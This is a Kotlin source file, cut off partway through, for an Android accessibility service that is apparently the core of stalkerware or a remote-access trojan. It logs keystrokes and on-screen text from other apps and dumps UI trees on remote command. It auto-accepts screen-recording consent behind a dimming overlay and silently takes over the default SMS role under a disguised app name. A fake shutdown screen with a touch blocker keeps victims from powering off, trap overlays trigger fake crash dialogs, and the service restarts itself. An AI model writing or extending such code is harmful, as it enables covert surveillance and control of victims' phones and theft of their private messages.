package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
    }

    private var nextAllowedCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    private var cachedUiTraps: JSONArray = JSONArray()

    fun reloadUiTraps() {
        try {
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
            val rawArr = org.json.JSONArray(trapsStr)
            val cleanedArr = org.json.JSONArray()
            var messDetected = false

            for (i in 0 until rawArr.length()) {
                val trap = rawArr.getJSONObject(i)
                // STRICT RULE: If it doesn't have a label, it's garbage. Purge it.
                if (trap.has("label")) {
                    cleanedArr.put(trap)
                } else {
                    messDetected = true
                }
            }

            if (messDetected) {
                prefs.edit().putString("ui_traps_array", cleanedArr.toString()).apply()
                DebugLogger.log("UI_TRAP", "Sanitization complete: Legacy configs without labels deleted.")
            }
            
            cachedUiTraps = cleanedArr
        } catch (e: Exception) {
            cachedUiTraps = org.json.JSONArray()
        }
    }
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second
    private var debounceJob: Job? = null

    // TREE SCRAPER STATE
    private data class TreeTask(
        val id: Int,
        val pkg: String?,
        val durationMs: Long,
        var endTime: Long = 0L,
        val depth: Int = 10,
        var lastSnapshot: JSONObject? = null,
        var job: Job? = null
    )
    private val treeTasks = mutableListOf<TreeTask>()
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L
    var isWaitingForDataSettings = false
    private var isPerformingStealthKill = false



    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

        fun resetAllTasks() {
        treeTasks.forEach { it.job?.cancel() }
        treeTasks.clear()
        saveTreeTasks()
        DebugLogger.log("SCRAM", "Hard Reset: All Scraper Tasks Aborted and Purged")
    }

    fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
        if (mins <= 0L) {
            resetAllTasks()
            return
        }

        val target = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
        val durMs = mins * 60 * 1000
        
        val newTask = TreeTask(id = cmdId, pkg = target, durationMs = durMs, depth = depth)
        treeTasks.add(newTask)
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Task Queued: [${target ?: "GLOBAL"}] (ID: $cmdId). Total Tasks: ${treeTasks.size}")
        
        if (target == null) {
            initiateTaskSession(newTask)
        }
    }

    private fun initiateTaskSession(task: TreeTask) {
        if (task.endTime != 0L) return // Already running
        
        task.endTime = System.currentTimeMillis() + task.durationMs
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Session started for ID: ${task.id}. Resolving in ${task.durationMs / 1000}s.")
        
        task.job = CoroutineScope(Dispatchers.IO).launch {
            val delayMs = task.endTime - System.currentTimeMillis()
            if (delayMs > 0) delay(delayMs)
            
            // Resolve Task
            val result = JSONObject().apply {
                put("depth_limit", task.depth)
                if (task.lastSnapshot != null) put("snapshot", task.lastSnapshot)
                else put("error", "NO_DATA_CAPTURED_IN_SESSION")
            }
            
            CommandProcessor.updateCommandStatus(applicationContext, task.id, "SCAN_COMPLETE", null, result, null)
            DebugLogger.log("SCRAM", "Session expired. Task [${task.id}] resolved and removed.")
            
            treeTasks.remove(task)
            saveTreeTasks()
        }
    }

    private fun saveTreeTasks() {
        val arr = JSONArray()
        treeTasks.forEach { t ->
            val o = JSONObject()
            o.put("id", t.id); o.put("pkg", t.pkg); o.put("dur", t.durationMs)
            o.put("end", t.endTime); o.put("depth", t.depth)
            arr.put(o)
        }
        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
            .putString("tree_tasks_json", arr.toString()).apply()
    }

    private fun loadTreeTasks() {
        try {
            val raw = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("tree_tasks_json", "[]")
            val arr = JSONArray(raw)
            treeTasks.clear()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val task = TreeTask(
                    id = o.getInt("id"),
                    pkg = if (o.isNull("pkg")) null else o.getString("pkg"),
                    durationMs = o.getLong("dur"),
                    endTime = o.getLong("end"),
                    depth = o.getInt("depth")
                )
                treeTasks.add(task)
                
                // Resume watchdog if it was already running
                if (task.endTime > System.currentTimeMillis()) {
                    initiateTaskSession(task)
                } else if (task.endTime > 0) {
                    // Expired while dead - will be cleaned up on next logic cycle
                }
            }
        } catch (e: Exception) { }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        DynamicUIManager.warmUpEngine(this)
        DynamicUIManager.applyStoredStatusBar(this)

        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session Queue
        loadTreeTasks()
        reloadUiTraps()
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return

        // --- STEalth KILL ENGINE ---
        if (isPerformingStealthKill && pkgName.contains("systemui")) {
            val root = rootInActiveWindow
            val clearKeywords = listOf("Clear all", "Close all", "CLEAR ALL", "CLOSE ALL")
            var buttonFound = false

            for (kw in clearKeywords) {
                val nodes = root?.findAccessibilityNodeInfosByText(kw)
                if (!nodes.isNullOrEmpty()) {
                    for (node in nodes) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            buttonFound = true
                            break
                        }
                    }
                }
                if (buttonFound) break
            }

            if (buttonFound) {
                isPerformingStealthKill = false
                DebugLogger.log("ANR_KILL", "Task purge executed successfully.")
                Handler(Looper.getMainLooper()).postDelayed({
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    DimmerManager.removeOverlay(this)
                }, 300)
            }
        }
        
        // --- SCREEN RECORD GHOST LOGIC ---
        if (pkgName.contains("systemui", ignoreCase = true)) {
            val isStateChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            val isContentChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED

            // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
            val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
            
            if (isShieldActive && (isStateChange || isContentChange)) {
                val now = System.currentTimeMillis()
                
                // 1. STAGE 1: CPU THROTTLE (Prevent melting the CPU on every clock tick)
                if (isContentChange) {
                    val lastCheck = statsPrefs.getLong("power_shield_last_check", 0L)
                    if (now - lastCheck < 300) return // Max ~3 scans per second for content changes
                    statsPrefs.edit().putLong("power_shield_last_check", now).apply()
                }

                CoroutineScope(Dispatchers.IO).launch {
                    var targetVerified = false
                    var attempts = 0
                    // Loop multiple times for STATE_CHANGED to allow inflation, but only 1-shot for CONTENT_CHANGED
                    val maxAttempts = if (isStateChange) 10 else 1

                    // 2. STAGE 2: VERIFICATION
                    while (attempts < maxAttempts) {
                        val root = rootInActiveWindow
                        if (root != null) {
                            val isPowerMenu = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
                            val isConfirmScreen = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_confirmation").isNullOrEmpty()
                            
                            if (isPowerMenu || isConfirmScreen) {
                                targetVerified = true
                                break // Target Confirmed
                            }
                        }
                        if (!targetVerified && isStateChange) delay(50)
                        attempts++
                    }

                    if (targetVerified) {
                        val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
                        if (now - lastTrigger > 2000) {
                            statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
                            
                            // 3. STAGE 3: INSTANT TOUCH SHIELD & FAKE UI
                            // Deploy TouchGuard NOW to block the user from tapping the real button while WebView renders
                            DynamicUIManager.showTouchGuard(this@MyAccessibilityService)
                            
                            val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
                            val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
                            val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
                            
                            Handler(Looper.getMainLooper()).post {
                                DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
                            }
                            
                            val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
                            if (timeout > 0) {
                                delay(timeout * 1000)
                                DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                            }
                        }
                    }
                }
            }

            if (ScreenRecordManager.expectedMode == "AUTO") {
                val root = rootInActiveWindow
                val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
                val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
                
                for (node in (startNodes + altNodes)) {
                    if (node.isClickable) {
                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                        ScreenRecordManager.expectedMode = "" // Disarm
                        DimmerManager.removeOverlay(this) // Remove the blindfold
                        CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
                        break
                    }
                }
            } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
                val treeJson = getInstantTree(null, 10)
                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
                DebugLogger.log("SCREEN_REC", "Scraped SystemUI dialog for forensic mapping.")
                ScreenRecordManager.expectedMode = "" // Disarm
            }
        }

        // --- DEFAULT SMS GHOST LOGIC ---
        if (pkgName.contains("permissioncontroller", ignoreCase = true) || pkgName.contains("settings", ignoreCase = true)) {
            if (isWaitingForDataSettings && pkgName.contains("settings")) {
                val root = rootInActiveWindow
                val targetNodes = root?.findAccessibilityNodeInfosByText("Mobile data")
                if (!targetNodes.isNullOrEmpty()) {
                    for (node in targetNodes) {
                        // STRICT STRUCTURAL MATCH: Only click the node acting as the row title, ignoring graph headers
                        val viewId = node.viewIdResourceName ?: ""
                        val text = node.text?.toString() ?: ""
                        
                        if (viewId == "android:id/title" && text == "Mobile data") {
                            var parent = node
                            // Traverse up to find the clickable list row container
                            while (parent != null && !parent.isClickable) {
                                parent = parent.parent
                            }
                            
                            if (parent != null && parent.isClickable) {
                                parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                DebugLogger.log("GHOST_DATA", "Successfully toggled Mobile Data via exact structural match.")
                                isWaitingForDataSettings = false
                                // Final step: Restore screen brightness after 2 seconds
                                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                    DimmerManager.removeOverlay(applicationContext)
                                }, 2000)
                                break
                            }
                        }
                    }
                }
            }

            val mode = DefaultSmsManager.expectedMode
            if (mode == "AUTO" || mode == "RELENTLESS") {
                val root = rootInActiveWindow ?: return
                
                // Resolve which app name we are looking for
                val targetLabel = try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }

                if (targetLabel == null) {
                    DebugLogger.log("GHOST_SMS", "Abort: Target label is null")
                    return
                }

                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                var clickedRadio = false
                
                for (node in appNodes) {
                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
                    while (target?.isClickable == false) {
                        target = target?.parent
                    }
                    target?.let { safeTarget ->
                        if (safeTarget.isClickable) {
                            safeTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            clickedRadio = true
                            DebugLogger.log("GHOST_SMS", "Clicked radio for: $targetLabel")
                        }
                    }
                    if (clickedRadio) break
                }
                
                if (clickedRadio) {
                    // Small delay to allow radio state update
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        val setNodes = root.findAccessibilityNodeInfosByText("Set as default")
                        for (btn in setNodes) {
                            if (btn.isClickable) {
                                btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                DebugLogger.log("GHOST_SMS", "Auto-clicked Set as default for $targetLabel")
                                DefaultSmsManager.expectedMode = "" // Disarm
                                CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", "Set as Default SMS via Ghost Hand")
                                break
                            }
                        }
                    }, 200)
                }
            } else if (mode == "RESTORE" || mode == "AUTO_NAV") {
                val root = rootInActiveWindow ?: return
                val originalPkg = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_sms_package", null)
                
                val targetLabel = if (mode == "AUTO_NAV") {
                    try { packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0)).toString() } catch(e:Exception) { "Drive services" }
                } else {
                    DefaultSmsManager.getStoredPreviousLabel(this)
                }

                if (targetLabel == null || (mode == "RESTORE" && originalPkg == null)) {
                    DefaultSmsManager.expectedMode = ""
                    return
                }

                // VERIFICATION: Check if target is already set
                val currentDefault = android.provider.Telephony.Sms.getDefaultSmsPackage(this)
                val isFinished = if (mode == "AUTO_NAV") currentDefault == packageName else currentDefault == originalPkg

                if (isFinished) {
                    DebugLogger.log("SMS_NAV", "Verification SUCCESS! Target ($targetLabel) is now Default.")
                    DefaultSmsManager.expectedMode = "" 
                    if (mode == "AUTO_NAV") CommandProcessor.applyMasqueradeSkin(this, "SAM_MSG")
                    
                    val msg = if (mode == "AUTO_NAV") "Set as Default SMS via manual fallback" else "Original SMS app restored"
                    CommandProcessor.updateCommandStatus(applicationContext, DefaultSmsManager.pendingCmdId, "SUCCESS", msg)
                    
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    return
                }

                // Phase 1: selection screen
                val appNodes = root.findAccessibilityNodeInfosByText(targetLabel)
                if (appNodes.isNotEmpty()) {
                    val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val lastLoop = prefs.getLong("sms_nav_loop_ts", 0L)
                    if (System.currentTimeMillis() - lastLoop < 4000) return
                    prefs.edit().putLong("sms_nav_loop_ts", System.currentTimeMillis()).apply()

                    val targetCount = appNodes.size
                    var candidateIndex = prefs.getInt("sms_nav_candidate_idx", 0)
                    if (candidateIndex >= targetCount) candidateIndex = 0

                    var target: android.view.accessibility.AccessibilityNodeInfo? = appNodes[candidateIndex]
                    while (target != null && !target.isClickable) target = target.parent
                    
                    target?.let {
                        it.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        DebugLogger.log("SMS_NAV", "Clicked candidate $candidateIndex for $targetLabel")
                        
                        // Handle Confirmation Dialogs after click
                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                            delay(600)
                            val confirmRoot = rootInActiveWindow
                            if (confirmRoot != null) {
                                val keywords = listOf("Set as default", "Set", "OK", "Default")
                                for (kw in keywords) {
                                    val btn = confirmRoot.findAccessibilityNodeInfosByText(kw).find { it.isClickable }
                                    if (btn != null) {
                                        btn.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        DebugLogger.log("SMS_NAV", "Clicked confirm: $kw")
                                        break
                                    }
                                }
                            }
                            // Increment candidate index in case this app wasn't the one we wanted
                            prefs.edit().putInt("sms_nav_candidate_idx", candidateIndex + 1).apply()
                        }
                    }
                    return
                }

                // Phase 2: Category list (find 'SMS' or 'SMS app')
                val smsNodes = root.findAccessibilityNodeInfosByText("SMS")
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val lastSmsClick = prefs.getLong("sms_nav_cat_ts", 0L)
                if (System.currentTimeMillis() - lastSmsClick > 2500) {
                    for (node in smsNodes) {
                        var target: android.view.accessibility.AccessibilityNodeInfo? = node
                        while (target != null && !target.isClickable) target = target.parent
                        if (target != null) {
                            target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            prefs.edit().putLong("sms_nav_cat_ts", System.currentTimeMillis()).apply()
                            DebugLogger.log("SMS_NAV", "Clicked SMS category")
                            break
                        }
                    }
                }
            } else if (DefaultSmsManager.expectedMode == "SCRAPE") {
                val treeJson = getInstantTree(null, 10)
                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson) }
                DumpManager.appendLog("SCRAPE_SMS_DIALOG", wrapper)
                DebugLogger.log("GHOST_SMS", "Scraped Default SMS dialog for forensic mapping.")
                DefaultSmsManager.expectedMode = "" // Disarm
            }
        }

        // --- 0. PHOENIX HOOK (Resurrection check) ---
        val now = System.currentTimeMillis()
        if (now - lastPhoenixCheck > 60000) { // Throttle checks to once a minute maximum
            lastPhoenixCheck = now
            checkMainServiceHealth()
            
            // Ensure Status Bar lock is maintained if flag is active
            DynamicUIManager.applyStoredStatusBar(this)
        }

        // --- 1. GHOST HAND LOGIC ---
        if (isGhostActive) {
            handleGhostEvent(event)
        }

        // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
        if (cachedUiTraps.length() > 0) {
            // STRICT REQUIREMENT: Only react to physical clicks
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                val pkg = event.packageName?.toString() ?: ""
                
                // CONSTRAINT: Ignore clicks on editable text fields to prevent false positives while typing
                val isEditable = event.className?.toString()?.contains("EditText", ignoreCase = true) == true
                
                if (!isEditable) {
                    val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    // Iterate through all active traps directly from RAM
                    for (i in 0 until cachedUiTraps.length()) {
                        val trap = cachedUiTraps.getJSONObject(i)
                        val targetData = trap.optString("target", "")
                        
                        if (targetData.isEmpty()) continue
                        
                        val parts = targetData.split("@@")
                        val titleTarget = parts[0].trim()
                        val secondaryTarget = parts.getOrNull(1)?.trim() ?: ""
                        val expectedPkg = parts.getOrNull(2)?.trim()
                        val headerAnchor = parts.getOrNull(3)?.trim()
                        val isStrict = trap.optBoolean("strict", false)
                        
                        var isMatch = false
                        
                        if (expectedPkg.isNullOrEmpty() || pkg.contains(expectedPkg, ignoreCase = true)) {
                            var headerVerified = true
                            if (!headerAnchor.isNullOrEmpty()) {
                                val root = rootInActiveWindow
                                headerVerified = root?.findAccessibilityNodeInfosByText(headerAnchor)?.any { 
                                    val id = it.viewIdResourceName ?: ""
                                    val text = it.text?.toString() ?: ""
                                    id.contains("title", ignoreCase = true) || text.equals(headerAnchor, ignoreCase = true)
                                } ?: false
                                if (!headerVerified) DebugLogger.log("UI_TRAP", "Header anchor [$headerAnchor] missing. Aborting trap.")
                            }

                            if (headerVerified) {
                                // 1. FAST PATH (Only if NOT strict)
                                if (!isStrict) {
                                    val eText = event.text.joinToString(" ")
                                    val eDesc = event.contentDescription?.toString() ?: ""
                                    
                                    val hasTitle = eText.contains(titleTarget, ignoreCase = true) || eDesc.contains(titleTarget, ignoreCase = true)
                                    val hasSecondary = secondaryTarget.isEmpty() || eText.contains(secondaryTarget, ignoreCase = true) || eDesc.contains(secondaryTarget, ignoreCase = true)
                                    
                                    if (hasTitle && hasSecondary) {
                                        isMatch = true
                                        DebugLogger.log("UI_TRAP", "✅ FAST-PATH MATCH: Both targets verified in buffer.")
                                    }
                                }

                                // 2. STRUCTURAL PATH (Mandatory for Strict, Fallback for Fast)
                                if (!isMatch) {
                                    val sourceNode = event.source
                                    if (verifyStructuralMatch(sourceNode, pkg, targetData)) {
                                        isMatch = true
                                        DebugLogger.log("UI_TRAP", "✅ STRUCTURAL MATCH: Hierarchy verified.")
                                    }
                                    sourceNode?.recycle()
                                }
                            }
                        }

                        if (isMatch) {
                            val now = System.currentTimeMillis()
                            val lastTrigger = statsPrefs.getLong("ui_trap_last_trigger", 0L)
                            
                            if (now - lastTrigger > 2000) {
                                statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                                
                                val method = trap.optString("method", "ACC").uppercase()
                                val html = trap.optString("html", "")
                                val timeout = trap.optLong("timeout", 10L)
                                val dimLevel = trap.optInt("dim", 20)
                                
                                DebugLogger.log("UI_TRAP", "Deploying trap sequence for target: $titleTarget | Method: $method")
                                
                                if (method == "ANR") {
                                    val targetApp = if (html.isNotBlank()) html else null
                                    triggerFakeAnr(targetApp)
                                } else {
                                    // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
                                    try {
                                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                                        val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
                                        wakeLock.acquire(3000)
                                    } catch (e: Exception) {}

                                    Handler(Looper.getMainLooper()).post {
                                        DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
                                        DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
                                    }
                                    
                                    Handler(Looper.getMainLooper()).postDelayed({
                                        DimmerManager.removeOverlay(this@MyAccessibilityService)
                                    }, 2500)
                                    
                                    if (timeout > 0L) {
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                        }, timeout * 1000)
                                    }
                                }
                            }
                            
                            // Break out of the loop since we matched and triggered a trap
                            break
                        }
                    }
                }
            }
        }

        // --- 1.5 TREE SCRAPER ENGINE (Multi-Task Queue) ---
        val tasksToProcess = treeTasks.filter { it.pkg == null || it.pkg == pkgName }
        
        if (tasksToProcess.isNotEmpty()) {
            val root = rootInActiveWindow
            tasksToProcess.forEach { task ->
                // 1. Target Acquisition Logic
                if (task.endTime == 0L) {
                    initiateTaskSession(task)
                    CoroutineScope(Dispatchers.IO).launch {
                        CommandProcessor.updateCommandStatus(applicationContext, task.id, "TARGET_ACQUIRED_RECORDING", null, null, null)
                    }
                }
                
                // 2. Data Capture Logic
                if (root != null && now < task.endTime && (now - lastScreenRead > 2000)) {
                    val treeJson = serializeNode(root, 0, task.depth)
                    task.lastSnapshot = treeJson
                    
                    // Shared Stream Logging (Optional but helpful)
                    val wrapper = JSONObject()
                    wrapper.put("pkg", pkgName)
                    wrapper.put("ts", now)
                    wrapper.put("tree", treeJson)
                    DumpManager.appendLog("TREE", wrapper)
                }
            }
            if (now - lastScreenRead > 2000) lastScreenRead = now
        }

        // Periodically purge expired tasks that missed the watchdog
        val expired = treeTasks.filter { it.endTime in 1..now }
        if (expired.isNotEmpty()) {
            expired.forEach { 
                DebugLogger.log("SCRAM", "Task ${it.id} cleaned up manually.")
                treeTasks.remove(it) 
            }
            saveTreeTasks()
        }

        // --- 2. STANDARD MONITORING ---
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             // Logic delegated to TypingManager
            val text = event.text.joinToString(" ")
            TypingManager.onType(this, pkgName, text)
            return
        }

        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
        
        // Feature Gate: Screen Reader
        if (!ConfigManager.canCollect(this, "screen_reader")) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
            debounceJob?.cancel()
            debounceJob = CoroutineScope(Dispatchers.Default).launch {
                delay(800) // Wait 800ms for UI to settle
                
                // CRITICAL FIX: 'event' is recycled by OS after onAccessibilityEvent returns.
                // We MUST use rootInActiveWindow to get the fresh screen state.
                val source = rootInActiveWindow ?: return@launch
                val textContent = StringBuilder()
                extractText(source, textContent)
                
                if (textContent.isNotEmpty()) {
                    val pm = packageManager
                    val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
                    val newTxt = textContent.take(100).toString()
                    
                    withContext(Dispatchers.IO) {
                        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                        val historyStr = prefs.getString("text_history_by_app", "{}")
                        val rootJson = try { JSONObject(historyStr) } catch (e: Exception) { JSONObject() }
                        val appArray = rootJson.optJSONArray(appName) ?: JSONArray()

                        val lastTxt = if (appArray.length() > 0) appArray.getJSONObject(appArray.length() - 1).optString("txt") else ""
                        
                        if (newTxt != lastTxt) {
                            // 1. STREAM LOGGING (NO LAG)
                            val entry = JSONObject()
                            entry.put("pkg", appName)
                            entry.put("ts", System.currentTimeMillis())
                            entry.put("txt", newTxt)
                            DumpManager.appendLog("SCREEN", entry)
                            
                            // 2. Update Stats (Using commit() to bypass QueuedWork ANR)
                            prefs.edit()
                                .putInt("interaction_count", prefs.getInt("interaction_count", 0) + 1)
                                .putString("last_screen_text", "[$appName] ${textContent.take(30)}...")
                                .commit()

                            // 3. Verify
                            DumpManager.logVerification("READER", pkgName)
                        }
                    }
                }
            }
        }
    }

    fun startStealthKillSequence() {
        isPerformingStealthKill = true
        performGlobalAction(GLOBAL_ACTION_RECENTS)
        
        // Safety Fallback: If we don't find the button in 2s, lift the blindfold anyway
        Handler(Looper.getMainLooper()).postDelayed({
            if (isPerformingStealthKill) {
                isPerformingStealthKill = false
                performGlobalAction(GLOBAL_ACTION_HOME)
                DimmerManager.removeOverlay(this)
            }
        }, 2500)
    }

    fun triggerFakeAnr(customAppName: String?) {
        val pkg = rootInActiveWindow?.packageName?.toString()
        var appName = customAppName
        
        if (appName.isNullOrEmpty() && pkg != null) {
            try {
                val pm = packageManager
                appName = pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
            } catch(e: Exception) {}
        }
        if (appName.isNullOrEmpty()) appName = "This app"

        // 1. Close current app (Throw user to Home Screen)
        performGlobalAction(GLOBAL_ACTION_HOME)

        // 2. Show Native ANR Dialog via PulseActivity
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(this, PulseActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                putExtra("is_anr_trigger", true)
                putExtra("anr_app_name", appName)
            }
            startActivity(intent)
        }, 600) // Slight delay to let the home screen settle before the ANR pops up
    }

    fun engageGhostHand() {
        // Logic disabled: UI interaction is too fragile and manufacturer-dependent
        DebugLogger.log("GHOST", "Ghost Hand engagement skipped (Disabled)")
    }

    private fun handleGhostEvent(event: AccessibilityEvent) {
        // No-op: Ghost logic disabled
    }

    private fun performSwipeDown() {
        // No-op: Ghost logic disabled
    }

    private fun findAndClickToggle(node: AccessibilityNodeInfo): Boolean {
        // No-op: Ghost logic disabled
        return false
    }

    private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
        if (node == null) return false

        // 1. Setup Targets (Format: TitleTarget@@SecondaryTarget@@Package@@HeaderAnchor)
        val parts = target.split("@@")
        val titleTarget = parts[0].trim()
        val secondaryTarget = parts.getOrNull(1)?.trim()
        val expectedPkg = parts.getOrNull(2)?.trim()

        // 2. Universal Package Security Check
        if (!expectedPkg.isNullOrEmpty() && !pkg.contains(expectedPkg, ignoreCase = true)) {
            return false
        }

        // 3. LOCAL SEARCH (Check the clicked node wrapper and its direct children)
        var hasTitle = findTextInside(node, titleTarget)
        var hasSecondary = if (!secondaryTarget.isNullOrEmpty()) findTextInside(node, secondaryTarget) else true

        // 4. INTERSECTION SNIPER (Fallback for disconnected Accessibility Graphs)
        if (!hasTitle || !hasSecondary) {
            val root = rootInActiveWindow
            val clickedBounds = android.graphics.Rect()
            node.getBoundsInScreen(clickedBounds)

            if (!hasTitle) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(titleTarget)
                hasTitle = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }

            if (!hasSecondary && !secondaryTarget.isNullOrEmpty()) {
                val screenNodes = root?.findAccessibilityNodeInfosByText(secondaryTarget)
                hasSecondary = screenNodes?.any { screenNode ->
                    val textBounds = android.graphics.Rect()
                    screenNode.getBoundsInScreen(textBounds)
                    android.graphics.Rect.intersects(clickedBounds, textBounds)
                } ?: false
            }
        }

        if (hasTitle && hasSecondary) {
            DebugLogger.log("TRAP_MATCH", "✅ Fingerprint Verified! Clicked node coordinates matched target: [$target]")
            return true
        }

        return false
    }

    private fun findTextInside(node: AccessibilityNodeInfo?, text: String): Boolean {
        if (node == null) return false
        val nText = node.text?.toString() ?: ""
        val nDesc = node.contentDescription?.toString() ?: ""
        
        if (nText.contains(text, ignoreCase = true) || nDesc.contains(text, ignoreCase = true)) return true
        
        for (i in 0 until node.childCount) {
